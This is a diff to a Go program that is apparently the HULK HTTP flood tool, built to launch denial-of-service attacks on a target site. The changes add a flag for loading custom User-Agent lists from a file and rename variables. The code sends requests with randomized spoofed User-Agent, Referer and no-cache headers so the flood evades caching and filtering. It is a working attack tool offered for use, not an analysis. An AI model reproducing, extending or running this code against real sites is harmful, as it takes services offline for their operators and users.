@@ -11,6 +11,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net/http"
 	"net/url"
@@ -34,17 +35,17 @@ const (
 
 // global params
 var (
-	request_counter  int      = 0
-	safe             bool     = false
-	headers_referers []string = []string{
+	safe            bool     = false
+	headersReferers []string = []string{
 		"http://www.google.com/?q=",
 		"http://www.usatoday.com/search/results?q=",
 		"http://engadget.search.aol.com/search?q=",
 		//"http://www.google.ru/?hl=ru&q=",
 		//"http://yandex.ru/yandsearch?text=",
 	}
-	headers_useragents []string = []string{
+	headersUseragents []string = []string{
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
 		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
 		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
 		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
@@ -61,11 +62,14 @@ var (
 )
 
 func main() {
-	var safe bool
-	var site string
+	var (
+		safe         bool
+		site, agents string
+	)
 
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
+	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.Parse()
 
 	t := os.Getenv("HULKMAXPROCS")
@@ -76,8 +80,23 @@ func main() {
 
 	u, e := url.Parse(site)
 	if e != nil {
-		fmt.Println("Error parsing url parameter.")
+		fmt.Println("error parsing url parameter\n")
 		os.Exit(1)
+	}
+
+	if agents != "" {
+		if data, err := ioutil.ReadFile(agents); err == nil {
+			headersUseragents = []string{}
+			for _, a := range strings.Split(string(data), "\n") {
+				if strings.TrimSpace(a) == "" {
+					continue
+				}
+				headersUseragents = append(headersUseragents, a)
+			}
+		} else {
+			fmt.Printf("can'l load User-Agent list from %s\n", agents)
+			os.Exit(1)
+		}
 	}
 
 	go func() {
@@ -136,10 +155,10 @@ func httpcall(url string, host string, s chan uint8) {
 			s <- callExitOnErr
 			return
 		}
-		q.Header.Set("User-Agent", headers_useragents[rand.Intn(len(headers_useragents))])
+		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
-		q.Header.Set("Referer", headers_referers[rand.Intn(len(headers_referers))]+buildblock(rand.Intn(5)+5))
+		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
